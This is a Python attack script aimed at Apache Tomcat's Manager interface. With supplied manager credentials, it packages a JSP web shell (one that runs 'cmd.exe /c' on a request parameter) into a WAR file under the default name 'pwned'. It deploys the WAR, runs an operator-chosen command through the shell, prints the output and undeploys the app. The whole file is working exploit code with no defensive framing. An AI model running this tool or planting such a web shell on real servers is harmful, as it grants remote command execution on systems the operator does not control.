import argparse
import os
import sys
import zipfile
import requests

JSP_PAYLOAD = """<%@ page import="java.util.*,java.io.*"%>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec("cmd.exe /c " + cmd);
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String line = dis.readLine();
        while (line != null) {
            out.println(line);
            line = dis.readLine();
        }
    }
%>"""

class TomcatManager:
    def __init__(self, target, username, password):
        self.target = target.rstrip('/')
        self.auth = (username, password)
        self.session = requests.Session()
        self.session.auth = self.auth

    def _request(self, method, path, **kwargs):
        try:
            url = f"{self.target}{path}"
            return self.session.request(method, url, timeout=15, **kwargs)
        except Exception as e:
            print(f"[!] Network Error: {e}")
            return None

    def _file_action(self, action_func):
        try:
            return action_func()
        except Exception as e:
            print(f"[!] System Error: {e}")
            return None

    def check_connection(self):
        response = self._request("GET", "/manager/text/list")

        if response is None:
            return False
        if response.status_code == 200:
            return True
        elif response.status_code == 401:
            print("[-] Invalid credentials")
        else:
            print(f"[-] Server returned an unexpected status code: {response.status_code}")
            return False

    def generate_war(self, app_name, jsp_content):
        war_filename = f"{app_name}.war"
        def create_zip():
            with zipfile.ZipFile(war_filename, 'w') as war:
                war.writestr("index.jsp", jsp_content)
            return war_filename
        return self._file_action(create_zip)

    def upload_war(self, war_path, app_name):
        upload_path = f"/manager/text/deploy?path=/{app_name}&update=true"
        def upload():
            with open(war_path, 'rb') as f:
                return self._request("PUT", upload_path, data=f)
        response = self._file_action(upload)
        return True if response and "OK" in response.text else False

    def cleanup(self, app_name):
        self._request("GET", f"/manager/text/undeploy?path=/{app_name}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog=os.path.basename(sys.argv[0]), add_help=True)
    parser.add_argument("-t", "--target", required=True, help="eg: http://localhost:8080")
    parser.add_argument("-u", "--user", required=True, help="Tomcat Manager user")
    parser.add_argument("-p", "--password", required=True, help="Tomcat Manager password")
    parser.add_argument("-c", "--command", required=True, help="eg: whoami")
    parser.add_argument("-a", "--app", default="pwned", help="App name to deploy (default: pwned)")
    
    args = parser.parse_args()
    tomcat = TomcatManager(args.target, args.user, args.password)

    if tomcat.check_connection():
        file = tomcat.generate_war(args.app, JSP_PAYLOAD)

        if file and tomcat.upload_war(file, args.app):
            tomcat._file_action(lambda: os.remove(file) if os.path.exists(file) else None)
            response = tomcat._request("GET", f"/{args.app}/index.jsp", params={'cmd': args.command})
            if response and response.status_code == 200:
                print(response.text.strip())
            tomcat.cleanup(args.app)

